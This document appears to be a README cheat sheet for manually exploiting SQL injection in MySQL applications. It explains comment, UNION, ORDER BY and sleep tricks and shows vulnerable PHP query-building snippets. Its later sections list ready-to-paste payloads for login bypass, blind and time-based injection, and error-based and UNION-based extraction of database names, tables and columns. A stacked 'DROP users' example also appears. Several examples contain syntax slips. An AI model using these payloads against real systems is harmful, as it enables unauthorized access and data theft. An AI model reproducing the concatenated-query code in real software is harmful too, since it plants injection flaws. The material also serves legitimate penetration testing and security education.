# MySQL-SQL-Injection-Cheatsheet
Tips for manually detect &amp; exploit SQL injection Vulnerability : MySQL

# Comment in MySQL <br>
1.  \# <br>
2.  -- (After double dash put space) <br>
3.  /\*\*/  <br>

Ex: SELECT * from users/**/WHERE username='rk' AND password='123'; /*SQL keyword is case insansitive */  <br>
 
# MySQL LIMIT Clause  <br>
1. The LIMIT clause is used to specify the number of records to return.  <br>

Ex: SELECT * FROM users where username='' or 1=1 LIMIT 1; /*Without limit keyword it will return multiple result. it will help in auth bypass*/  <br>
  
# MySQL UNION Operator  <br>
1. The UNION operator is used to combine the result-set of two or more SELECT statements.  <br>
    a. Every SELECT statement within UNION must have the same number of columns.  <br>
    b. The columns must also have similar data types.  <br>
    c. The columns in every SELECT statement must also be in the same order.  <br>
 
 Ex 1: Select  student_id, student_name, student_branch from students where student_id=1 UNION SELECT 1, 'hack' 'password'; /* Select from same table */  <br>
 
 Ex 2: Select  student_id, student_name, student_branch from students where student_id=1 UNION SELECT 1, 'hack' 'password' FROM hack.users;  /* Select from different DB and table */  <br>
  
# MYSQL Stack query <br>
1. MySQL does not support stack query with PHP, ASP.NET, Java <br>
Ex: SELECT * FROM products WHERE id = 1; DROP users-- /* stack query example */ <br>
  
# Substring  <br>
1. SUBSTRING('MySQL', 3, 2)  <br>

# String without quote(' or ") <br>
1. using CONCAT function <br>
Ex: SELECT CONCAT(CHAR(77),CHAR(89),CHAR(83),CHAR(81),CHAR(76)); /* return MYSQL string */  <br>

2. using hex value <br>
Ex: SELECT 0x4d7953514c;  /* return MYSQL string */  <br>

# Database version <br>
1. SELECT @@version <br>

# Current Database <br>
Ex: SELECT database(); <br>

# Current Database User <br>
Ex 1: SELECT user(); <br>
Ex 2:SELECT system_user(); <br>

# List DBA account <br>
Ex: SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; <br>

# Database contents <br>
1. Selecting all the tables along with DB <br>
Ex: SELECT * FROM information_schema.tables; <br>

2. Selecting all the columns in perticular table <br>
Ex: SELECT * FROM information_schema.columns WHERE table_name = 'TABLE_NAME'; <br>
# Order by <br>
1. The ORDER BY keyword is used to sort the result-set in ascending or descending order. But these keywords are used to identify no of columns present in the table. <br>
Ex: SELECT * FROM Customers ORDER BY 3; /* Start the checking of order from columm 1 and subsequent increament the value untill the app throw any error/not any result. Number of coloum will be the highest column which gives the sucessful result. */ <br>

# Time Delay <br>
Ex 1: SELECT sleep(10)  /* Sleep for 10 sec */ <br>

Ex 2: SELECT IF(CONDITION-HERE,sleep(10),'a'  /* Sleep for 10 sec if codition is True*/ <br>

# Detecting SQL Injection <br>
**Case 1: When source code is available.** <br>

Try to find out dynamic query where user inputs are concatenating to SQL query without/partial sanitizing user's input. Some time developer does mistake to concatenate user input into query while using parameterize SQL query. <br>
Ex 1: No parameterized query<br>
**$username** = $_POST["username"]; <br>
**$password** = $_POST["password"]; <br>
$sql="SELECT * FROM users WHERE username = **'$username'** AND password = **'$password'**"; <br>
$result = mysql_query($sql, $link); <br>
<br>

Ex 2: parameterized query <br>
**$firstname** = $_POST["firstname"]; <br>
$lastname = $_POST["lastname"]; <br>
$email = $_POST["email"]; <br>

$stmt = $conn->prepare("INSERT INTO MyGuests (firstname, lastname, email) <br>
VALUES (**$firstname**, :lastname, :email)"); /* Userinput **"firstname"** is directly concatenated into quey. So snippet is vulnerable to SQL Injection */  <br>
$stmt->bindParam(':lastname', $lastname); <br>
$stmt->bindParam(':email', $email); <br>
<br>

**Case 2: Black box Error based SQL Injection <br>**
1. single quote('), double quote("), and(&), semicolon(;), double dash(--) any character that break the SQL syntax. SQL server return Syntex error to end user. <br>
Ex : $sql="SELECT * FROM users WHERE username = ''' AND password = '$password'";  /* gives syntax error */ <br>
  
**Case 3. Blind SQL Injection (Conditional)** <br>
1. App return data based on True/False condition <br>
Ex 1: "SELECT * FROM books WHERE bookid = -2 or 2>1# <br>

Ex 2: "SELECT * FROM books WHERE bookid = -2 or 2>1 LIMIT 1# /*Return 1st result only*/ <br>
<br>

**Case 4: Blind SQL Injection (Time delay)** <br>
1. App return data after delaying certain time <br>
Ex 1: "SELECT * FROM books WHERE bookid = -2 or sleep(10)#; <br>

2. Condition time delay <br>
Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>

# Authentication Bypass <br>
1. admin' #  /*when user is admin */ <br>
2. admin' -- /*space after double dash*/ <br>
3. admin' or 1=1 # <br>
4. admin' and 1=1 # <br>
5. ' or 2>1 #  /*when username is not known*/ <br>
6. " or 2<1 #   /*When user input is quoted under double dash*/ <br>
7. ' or 1=1 LIMIT 1 # <br>
8. ' | 1=1 # <br>
9. ' & 2=2 # <br>

# Data Exfiltration
**Case 1: Error based (Error based SQL Injection is used when UNION based SQL Injection is not possible) <br>**
Ex 1: Extract DB version <br>
test' AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>
-1 AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>  /When inserting input is not quoted with single/double quote*/

Ex 2: Extract DB<br>
test' AND extractvalue(rand(),concat(0x3a,(SELECT database()))) #<br>

Ex 3: Extract All tables<br>
test' AND extractvalue(rand(),concat(0x3a,(SELECT table_name from information_schema.tables limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>

Ex 4: Extract columns from a table<br>
test' AND extractvalue(rand(),concat(0x3a,(SELECT column_name from information_schema.columns where table_name='xyz' limit o,1))) #  /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>
    
**Case 2: Union based SQL Injection** /* For number of coloumns & column types see concept above Union section. Here assume, 2 columns present on the main select query*/<br
Ex 1: Extract DB version <br> 
test' union all select null,@@version # <br
1 union all select null,@@version # /When inserting input is not quoted with single/double quote*/<br

Ex 2: Extract DB<br>
test' union all select null,database() #<br>

Ex 3: Extract All tables<br>
test' union all select null,(SELECT table_name from information_schema.tables limit 1,1) # /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>

Ex 4: Extract columns from a table<br>
test' union all select null,(SELECT column_name from information_schema.columns where table_name='xyz' limit o,1) # /*where o=offset, 1= one result, extract result one by one by increamenting offset value. For extracting first row put o=1 */<br>

**Case 3: Conditional response based SQL Injection-->Coming soon**

